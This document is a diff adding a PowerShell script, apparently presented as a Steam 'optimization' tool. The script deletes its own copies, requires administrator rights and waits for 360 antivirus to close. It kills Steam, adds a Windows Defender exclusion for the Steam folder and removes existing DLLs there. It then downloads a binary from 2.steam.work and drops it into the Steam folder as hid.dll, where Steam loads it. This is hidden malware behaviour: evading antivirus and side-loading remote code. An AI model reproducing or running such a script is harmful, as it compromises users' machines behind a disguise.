@@ -1,0 +1,175 @@
+Clear-Host
+Write-Host -NoNewline "          _____                _____                    _____                    _____                    _____          `r" -ForegroundColor:blue
+Write-Host -NoNewline "         /\    \              /\    \                  /\    \                  /\    \                  /\    \         `r" -ForegroundColor:blue
+Write-Host -NoNewline "        /::\    \            /::\    \                /::\    \                /::\    \                /::\____\        `r" -ForegroundColor:blue
+Write-Host -NoNewline "       /::::\    \           \:::\    \              /::::\    \              /::::\    \              /::::|   |        `r" -ForegroundColor:blue
+Write-Host -NoNewline "      /::::::\    \           \:::\    \            /::::::\    \            /::::::\    \            /:::::|   |        `r" -ForegroundColor:blue
+Write-Host -NoNewline "     /:::/\:::\    \           \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /::::::|   |        `r" -ForegroundColor:blue
+Write-Host -NoNewline "    /:::/__\:::\    \           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/|::|   |        `r" -ForegroundColor:blue
+Write-Host -NoNewline "    \:::\   \:::\    \          /::::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/ |::|   |        `r" -ForegroundColor:blue
+Write-Host -NoNewline "  ___\:::\   \:::\    \        /::::::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/  |::|___|______  `r" -ForegroundColor:blue
+Write-Host -NoNewline " /\   \:::\   \:::\    \      /:::/\:::\    \  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\    \  /:::/   |::::::::\    \ `r" -ForegroundColor:blue
+Write-Host -NoNewline "/::\   \:::\   \:::\____\    /:::/  \:::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::\____\/:::/    |:::::::::\____\`r" -ForegroundColor:blue
+Write-Host -NoNewline "\:::\   \:::\   \::/    /   /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\  /:::/    /\::/    / ~~~~~/:::/    /`r" -ForegroundColor:blue
+Write-Host -NoNewline " \:::\   \:::\   \/____/   /:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\/:::/    /  \/____/      /:::/    / `r" -ForegroundColor:blue
+Write-Host -NoNewline "  \:::\   \:::\    \      /:::/    /            \:::\   \:::\    \               \::::::/    /               /:::/    /  `r" -ForegroundColor:blue
+Write-Host -NoNewline "   \:::\   \:::\____\    /:::/    /              \:::\   \:::\____\               \::::/    /               /:::/    /   `r" -ForegroundColor:blue
+Write-Host -NoNewline "    \:::\  /:::/    /    \::/    /                \:::\   \::/    /               /:::/    /               /:::/    /    `r" -ForegroundColor:blue
+Write-Host -NoNewline "     \:::\/:::/    /      \/____/                  \:::\   \/____/               /:::/    /               /:::/    /     `r" -ForegroundColor:blue
+Write-Host -NoNewline "      \::::::/    /                                 \:::\    \                  /:::/    /               /:::/    /      `r" -ForegroundColor:blue
+Write-Host -NoNewline "       \::::/    /                                   \:::\____\                /:::/    /               /:::/    /       `r" -ForegroundColor:blue
+Write-Host -NoNewline "        \::/    /                                     \::/    /                \::/    /                \::/    /        `r" -ForegroundColor:blue
+Write-Host -NoNewline "         \/____/                                       \/____/                  \/____/                  \/____/         `r" -ForegroundColor:blue
+
+$filePathToDelete = Join-Path $env:USERPROFILE "a.ps1"
+if (Test-Path $filePathToDelete) {
+    Remove-Item -Path $filePathToDelete -ErrorAction SilentlyContinue
+}
+$desktopFilePathToDelete = Join-Path ([System.Environment]::GetFolderPath('Desktop')) "a.ps1"
+if (Test-Path $desktopFilePathToDelete) {
+    Remove-Item -Path $desktopFilePathToDelete -ErrorAction SilentlyContinue
+}
+
+$steamRegPath = 'HKCU:\Software\Valve\Steam'
+$localPath = Join-Path $env:LOCALAPPDATA "Steam"
+if (Test-Path $steamRegPath) {
+    $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
+    if ($properties.PSObject.Properties.Name -contains 'SteamPath') {
+        $steamPath = $properties.SteamPath
+    }
+}
+
+$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+if (-not ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
+    $TextShow = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W+ivt+mHjeaWsOaJk+W8gFBvd2VyIHNoZWxsIOaJk+W8gOaWueW8j+S7peeuoeeQhuWRmOi6q+S7vei/kOihjF0="))
+    Write-Host "$TextShow" -ForegroundColor:red
+    return
+}
+
+function Start-SteamOptimization {
+    param()
+    
+    try {
+        $security360check = $false
+        if(Get-Process "360Tray*" -ErrorAction SilentlyContinue){
+            $security360check = $true
+            while(Get-Process "360Tray*" -ErrorAction SilentlyContinue){
+                Write-Host "[360]" -ForegroundColor:Red
+                Start-Sleep 1.5
+            }
+            Start-SteamOptimization
+        }
+        
+        if(Get-Process "360sd*" -ErrorAction SilentlyContinue) {
+            $security360check = $true
+            while(Get-Process "360sd*" -ErrorAction SilentlyContinue){
+                Write-Host "[360]" -ForegroundColor:Red
+                Start-Sleep 1.5
+            }
+            Start-SteamOptimization
+        }
+        
+        if ($security360check) {
+            return
+        }
+    }
+    catch {}
+    
+    if ([string]::IsNullOrEmpty($steamPath)) {
+        Write-Host "[Steam]" -ForegroundColor:Red
+        return
+    }
+    
+    Write-Host "[ServerStart        OK]" -ForegroundColor:green
+    
+    try {
+        $processes = Get-Process -Name steam* -ErrorAction SilentlyContinue
+        if ($processes) {
+            $processes | ForEach-Object { $_.Kill() }
+            Start-Sleep 1.5
+        }
+        
+        if (Get-Process -Name "steam.exe" -ErrorAction SilentlyContinue) {
+            $processes = Get-Process -Name "steam.exe" -ErrorAction SilentlyContinue
+            if ($processes) {
+                $processes | ForEach-Object { $_.Kill() }
+                Start-Sleep 1
+            }
+        }
+    }
+    catch {}
+
+    if (-not (Test-Path $localPath)) {
+        try {
+            New-Item -Path $localPath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+            if (-not (Test-Path $localPath)) {
+                New-Item $localPath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+            }
+        }
+        catch {}
+    }
+
+    try {
+        Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue
+        Start-Sleep 2
+    }
+    catch {}
+
+    Write-Host "[Result->0          OK]" -ForegroundColor:green
+
+    try {
+        $files = @(
+            "version.dll",
+            "user32.dll",
+            "steam.cfg",
+            "hid.dll"
+        )
+        
+        foreach ($file in $files) {
+            $targetPath = Join-Path $steamPath $file
+            if (Test-Path $targetPath) {
+                Remove-Item $targetPath -Force -ErrorAction SilentlyContinue | Out-Null
+            }
+        }
+        
+        $d = $steamPath + "/hid"
+    }
+    catch {
+        $TextShow = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W+W8guW4uOaui+eVmeivt+aMieeFp+i3r+W+hOWIoOmZpOaWh+S7tl0tPg=="))
+        Write-Host "$TextShow[$d]" -ForegroundColor:red
+        return
+    }
+
+    $downApi = "http://2.steam.work/api/v1/download/pwsDown"
+    
+    try {
+        irm -Uri $downApi -Method Post -Headers @{ Referer = "libary" } -OutFile $d -ErrorAction Stop
+        $newFilePath = [System.IO.Path]::ChangeExtension($d, ".dll")
+        Rename-Item -Path $d -NewName $newFilePath
+        
+        Write-Host "[Result->1          OK]" -ForegroundColor:green
+        $d = $localPath + "/localData.vdf"
+        irm -Uri $downApi -Method Post -Headers @{ Referer = "localData.vdf" } -OutFile $d -ErrorAction Stop
+        Write-Host "[Result->2          OK]" -ForegroundColor:green
+        
+        Start-Sleep 1
+    }
+    catch {
+        Write-Host "[Download Failed]" -ForegroundColor:Red
+        return
+    }
+
+    try {
+        Start-Process "steam://" -ErrorAction SilentlyContinue
+        $TextShow = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W+i/nuaOpeacjeWZqOaIkOWKn+WcqFN0ZWFt5YWl5r+A5rS7IDPnp5LlkI7oh6rliqjlhbPpl61d"))
+        Write-Host "$TextShow" -ForegroundColor:green
+        Start-Sleep 3
+    }
+    catch {
+        Write-Host "[Steam Start Failed]" -ForegroundColor:Red
+    }
+    
+    exit
+}
+
+Start-SteamOptimization
